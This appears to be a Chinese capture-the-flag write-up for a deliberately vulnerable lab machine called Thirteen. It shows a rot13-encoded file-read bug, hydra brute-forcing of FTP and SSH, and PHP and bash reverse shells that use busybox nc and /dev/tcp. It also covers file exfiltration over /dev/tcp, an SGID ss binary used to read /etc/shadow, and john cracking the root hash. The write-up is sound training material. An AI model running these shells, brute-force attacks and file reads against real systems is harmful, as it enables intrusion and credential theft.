
### 1. 基本信息

```
靶机链接：
https://maze-sec.com/library
https://hackmyvm.eu/machines/machine.php?vm=Thirteen
```

```shell
难度：⭐️⭐️
知识点：信息收集，目录扫描，`rot13`，`ftp`，`cupp`工具，`hydra`爆破，`ss`提权
```

### 2. 信息收集

##### Nmap

```shell
└─# arp-scan -l | grep PCS
192.168.31.8    08:00:27:c0:05:39       PCS Systemtechnik GmbH
└─# IP=192.168.31.8
└─# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 12:58 CST
Nmap scan report for 13max (192.168.31.8)
Host is up (0.0019s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     pyftpdlib 2.0.1
| ftp-syst:
|   STAT:
| FTP server status:
|  Connected to: 192.168.31.8:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: iCloud Vault Access
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:C0:05:39 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

开放了`21、22、80`端口,先常规扫一下目录

```shell
└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
[13:00:08] 200 -  284B  - /config.txt
[13:00:12] 301 -  311B  - /logs  ->  http://192.168.31.8/logs/
[13:00:16] 200 -   97B  - /readme.txt
└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP/logs/ -x.txt,.log,.php,.html,.bak
=================
/ftp_server.log       (Status: 200) [Size: 12507]
```

发现`/logs/ftp_server.log`，访问是`ftp`运行日志

##### `rot13`加密

![image-20250810130050116](https://gitee.com/shui666/images/raw/master/images/image-20250810130050116.png)

直接访问`80`端口，页面预留了`Welcome List、Sync Config、Help Manual`三个标签，点击后跳转`/?theme=jrypbzr.gkg、/?theme=pbasvt.gkg、/?theme=ernqzr.gkg`，发现可通过 `?theme=` 参数指定要访问的文件，参数值应为`rot13`加密的文件路径（如welcome .txt->rot13-> `jrypbzr.gkg`），即输入框允许用户通过输入`rot13`加密路径实现任意文件读取。

```shell
#读取/etc/passwd
└─# curl http://$IP/?theme=/rgp/cnffjq
<pre style='background: #1a1a1a; color: #00ff00; padding: 20px; border-radius: 8px; max-height: 400px; overflow-y: auto;'>root:x:0:0:root:/root:/bin/bash
......
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
......
welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
max:x:1001:1001::/home/max:/bin/bash
</pre>
```

通过 `?theme=` 参数经`rot13`编码后可以任意文件读取，分别读一下`/etc/passwd`、`user.txt`，有两个用户`welcome`、`max`，直接读`user.txt`失败，后面才知道正确的是读取`user.flag`

```shell
/etc/passwd
#rot13
/rgp/cnffjq

/home/welcome/user.txt
#rot13
/ubzr/jrypbzr/hfre.gkg

```

### 3.获得`www-data`权限

点击主页`Help Manual`标签提示信息`ADMIN`账号，爆破一下`ftp`账户密码

```shell
#http://192.168.31.8/?theme=ernqzr.gkg
This tool is for ADMIN only!
Use the encrypted path input to explore hidden files!
```

使用`hydra`爆破，拿到`ftp`的账户信息信息：`ADMIN,12345`

```shell
└─# hydra -l ADMIN -P /usr/share/seclists/TopDic/TOP4000Passwd.txt ftp://$IP  -V -I -u -f -e nsr
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-10 13:20:03
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1451 login tries (l:1/p:1451), ~91 tries per task
[DATA] attacking ftp://192.168.31.8:21/
[ATTEMPT] target 192.168.31.8 - login "ADMIN" - pass "ADMIN" - 1 of 1451 [child 0] (0/0)
[ATTEMPT] target 192.168.31.8 - login "ADMIN" - pass "" - 2 of 1451 [child 1] (0/0)
[ATTEMPT] target 192.168.31.8 - login "ADMIN" - pass "NIMDA" - 3 of 1451 [child 2] (0/0)
[ATTEMPT] target 192.168.31.8 - login "ADMIN" - pass "Password" - 4 of 1451 [child 3] (0/0)
......
[ATTEMPT] target 192.168.31.8 - login "ADMIN" - pass "pass" - 30 of 1451 [child 12] (0/0)
[ATTEMPT] target 192.168.31.8 - login "ADMIN" - pass "tomcat" - 31 of 1451 [child 13] (0/0)
[ATTEMPT] target 192.168.31.8 - login "ADMIN" - pass "OvW*busr1" - 32 of 1451 [child 14] (0/0)
[ATTEMPT] target 192.168.31.8 - login "ADMIN" - pass "j2deployer" - 33 of 1451 [child 15] (0/0)
[21][ftp] host: 192.168.31.8   login: ADMIN   password: 12345
[STATUS] attack finished for 192.168.31.8 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-10 13:20:07
```

##### ftp

`ftp`登陆后目录下有`ftp_server.py、rev.sh`两文件

```shell
└─# lftp $IP -u ADMIN
密码:
lftp ADMIN@192.168.31.8:~> ls
-rw-r--r--   1 root     root         1607 Jul 05 07:08 ftp_server.py
-rw-r--r--   1 root     root           54 Jul 05 07:10 rev.sh
lftp ADMIN@192.168.31.8:/> cat rev.sh
#!/bin/bash
bash -i >& /dev/tcp/10.132.0.74/4444 0>&1
56 bytes transferred
```

测试发现目录里的`ftp_server.py`和`/opt/ftp_server.py`中一样，说明`ftp`上传目录为`/opt`

准备一个反弹shell的文件传上去（把`/webshells/php/php-reverse-shell.php`另存为`reverse.txt`）。上传后目录为`/opt/reverse.txt-`-rot13-->`/bcg/erirefr.gkg`

```shell
#http://192.168.31.8/?theme=/bcg/erirefr.gkg
└─# nc -lvp 1234
listening on [any] 1234 ...
id
connect to [192.168.31.126] from 192.168.31.8 [192.168.31.8] 34880
```

闪一下就断掉了，说明某些函数被`ban`了,先传个`phpinfo()`看看哪些函数不能用

```shell
echo '<?php phpinfo();?>' > php.txt

lftp ADMIN@192.168.31.8:/> put php.txt
19 bytes transferred
#http://192.168.31.8/?theme=/bcg/cuc.gkg
#搜disable_functions，禁用了这些
system,passthru,shell_exec,proc_open,pcntl_exec,dl	

```

将反弹shell换一下

```shell
<?php
  exec("busybox nc 192.168.31.126 1234 -e /bin/bash "); 
?>
```

重传

```shell
└─# cat reverse.txt
<?php
  exec("busybox nc 192.168.31.126 1234 -e /bin/bash ");
?>

lftp ADMIN@192.168.31.8:/> put reverse.txt
66 bytes transferred
lftp ADMIN@192.168.31.8:/> ls
-rw-r--r--   1 root     root         1607 Jul 05 07:08 ftp_server.py
-rw-r--r--   1 root     root           19 Aug 10 05:28 php.txt
-rw-r--r--   1 root     root           54 Jul 05 07:10 rev.sh
-rw-r--r--   1 root     root           66 Aug 10 05:28 reverse.txt
lftp ADMIN@192.168.31.8:/>

http://192.168.31.8/?theme=/bcg/erirefr.gkg

└─# nc -lvp 1234
listening on [any] 1234 ...
id
192.168.31.8: inverse host lookup failed: Host name lookup failure
connect to [192.168.31.126] from (UNKNOWN) [192.168.31.8] 49932
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

拿到`user.flag`

```
www-data@13max:/var/www/html$ cd /home/
www-data@13max:/home$ ls
max  welcome
www-data@13max:/home$ cd welcome/
www-data@13max:/home/welcome$ ls
user.flag
www-data@13max:/home/welcome$ cat user.flag
flag{user-a89162ba751904d5****************}
```



### 4.获得`welcome`权限

##### `cupp`工具

`/home/max/.hint`给了`cupp`的提示信息，结合账户`welcome`和`welcome.txt`中信息，猜测是需要`cupp`生成字典去爆破

```shell
www-data@13max:/home/max/.hint$ cat .pucc
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]

www-data@13max:/home/max/.hint$ pwd
/home/max/.hint
www-data@13max:/home/max/.hint$ cat /var/www/html/welcome.txt
Abdikarím
Shire
Gullét
Ibráhim
Dalmar
Sharmáke
Suléman
Rahim
Farhan
Feisal
Féysal
Ellyas
Sonári
Kadér
Zakaria
Adam
Mahad
Said
Maslah
Bille
Max
Sadiq
Dáhir
Warsamé
Jamać
```

先处理下字典

```shell
www-data@13max:/home/max/.hint$ cat /var/www/html/welcome.txt > /dev/tcp/192.168.31.126/1235
└─# nc -lvp 1235 > welcome.txt
listening on [any] 1235 ...
connect to [192.168.31.126] from (UNKNOWN) [192.168.31.8] 34182
└─# cupp -w welcome.txt
/usr/bin/cupp:146: SyntaxWarning: invalid escape sequence '\ '
  print("      \                     # User")
/usr/bin/cupp:147: SyntaxWarning: invalid escape sequence '\ '
  print("       \   \033[1;31m,__,\033[1;m             # Passwords")
/usr/bin/cupp:148: SyntaxWarning: invalid escape sequence '\ '
  print("        \  \033[1;31m(\033[1;moo\033[1;31m)____\033[1;m         # Profiler")
/usr/bin/cupp:149: SyntaxWarning: invalid escape sequence '\ '
  print("           \033[1;31m(__)    )\ \033[1;m  ")
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


      *************************************************
      *                    WARNING!!!                 *
      *         Using large wordlists in some         *
      *       options bellow is NOT recommended!      *
      *************************************************

> Do you want to concatenate all words from wordlist? Y/[N]:
> Do you want to add special chars at the end of words? Y/[N]:
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]:

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to welcome.txt.cupp.txt, counting 313 words.
[+] Now load your pistolero with welcome.txt.cupp.txt and shoot! Good luck!

```

##### `hydra`爆破

爆破一下密码

```shell
└─# hydra -l welcome -P welcome.txt.cupp.txt ssh://$IP  -V -I -u -f -e nsr
.....
[RE-ATTEMPT] target 192.168.31.8 - login "welcome" - pass "Zakaria2019" - 290 of 319 [child 10] (0/3)
[ATTEMPT] target 192.168.31.8 - login "welcome" - pass "Zakaria2020" - 291 of 319 [child 1] (0/3)
[22][ssh] host: 192.168.31.8   login: welcome   password: Zakaria2020
[STATUS] attack finished for 192.168.31.8 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-10 13:41:15
```

获得`welcome`的账户密码`Zakaria2020`，登陆成功

```shell
└─# ssh welcome@$IP
#Zakaria2020
welcome@13max:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```



### 5.获得`root`权限

没有`sudo`可以执行

```shell
welcome@13max:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for welcome:
Sorry, user welcome may not run sudo on 13max.
```

传个脚本扫一下

```shell
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.31.8 - - [10/Aug/2025 13:47:09] "GET /linpeas.sh HTTP/1.1" 200 -

welcome@13max:~$ busybox wget 192.168.31.126/linpeas.sh
Connecting to 192.168.31.126 (192.168.31.126:80)
linpeas.sh           100% |************************************************************************|  808k  0:00:00 ETA
welcome@13max:~$ bash linpeas.sh
```

发现异常`SGID`文件`/usr/local/bin/supersuid`

```shell
╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwxr-sr-x 1 root shadow 39K Feb 14  2019 /usr/sbin/unix_chkpwd
......
-rwsr-sr-- 1 root welcome 158K Jul  4 10:37 /usr/local/bin/supersuid (Unknown SGID binary)
```

##### `ss`提权

运行`/usr/local/bin/supersuid`，发现输出和`netstat或ss`工具很像，测试就是`ss`

```shell
welcome@13max:~$ /usr/local/bin/supersuid
Netid      State      Recv-Q      Send-Q                         Local Address:Port              Peer Address:Port
u_str      ESTAB      0           0                                          * 14012                        * 14013
u_str      ESTAB      0           0                                          * 13826                        * 13827
u_str      ESTAB      0           0                                          * 13827                        * 13826
......
welcome@13max:~$ which netstat
welcome@13max:~$ which ss
/usr/bin/ss
welcome@13max:~$ diff /usr/local/bin/supersuid /usr/bin/ss
```

查表[[gtfobins.github.io](https://gtfobins.github.io/)](https://gtfobins.github.io/)没得现成方案，`-h`看帮助`-F`参数可读文件

```shell
welcome@13max:~$ ss -h
Usage: ss [ OPTIONS ]
       ss [ OPTIONS ] [ FILTER ]
   -h, --help          this message
......
   -F, --filter=FILE   read filter information from FILE
       FILTER := [ state STATE-FILTER ] [ EXPRESSION ]
       STATE-FILTER := {all|connected|synchronized|bucket|big|TCP-STATES}
         TCP-STATES := {established|syn-sent|syn-recv|fin-wait-{1,2}|time-wait|closed|close-wait|last-ack|listening|closing}
          connected := {established|syn-sent|syn-recv|fin-wait-{1,2}|time-wait|close-wait|last-ack|closing}
       synchronized := {established|syn-recv|fin-wait-{1,2}|time-wait|close-wait|last-ack|closing}
             bucket := {syn-recv|time-wait}
                big := {established|syn-sent|fin-wait-{1,2}|closed|close-wait|last-ack|listening|closing}
```

尝试读取`root.flag`成功

```
welcome@13max:~$ supersuid -F /root/root.flag
Error: an inet prefix is expected rather than "flag{root-aaa245a6e5a82937****************}".
Cannot parse dst/src address.
```

读取`/etc/shadow`去爆破密码

```shell
welcome@13max:~$ supersuid -F /etc/shadow
Error: an inet prefix is expected rather than "root:$6$Cax26XI4SpAAItdE$7iVSsRoQT/o0b3.V9jMiljdau506ePGmZLkIl5JH9COngDqdXJkGnizRIhaLJu/JbwWZ.7XyF/MwzuDusZJcg1:20273:0:99999:7::"
```

##### `john`爆破

用户密码哈希保存在/etc/shadow文件里，格式为"用户名:加密密码:最后修改时间:最小间隔:有效期:警告期:宽限期:失效时间"这样的9个字段

```shell
└─# cat shadow.txt
root:$6$Cax26XI4SpAAItdE$7iVSsRoQT/o0b3.V9jMiljdau506ePGmZLkIl5JH9COngDqdXJkGnizRIhaLJu/JbwWZ.7XyF/MwzuDusZJcg1:20273:0:99999:7::
└─# john shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
april7th         (root)
1g 0:00:00:03 DONE (2025-08-10 14:06) 0.2564g/s 48836p/s 48836c/s 48836C/s joan08..55995599
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
└─# john --show shadow.txt
root:april7th:20273:0:99999:7::
```

获得`root`密码`april7th`

##### 拿到`root.txt`

```shell
welcome@13max:~$ su
Password:#april7th
root@13max:/home/welcome# id
uid=0(root) gid=0(root) groups=0(root)
root@13max:/home/welcome# cd
root@13max:~# cat /root/root.flag
flag{root-aaa245a6e5a82937****************}
```

群主大佬的[WP](https://www.bilibili.com/video/BV1Jg3QzoEZC)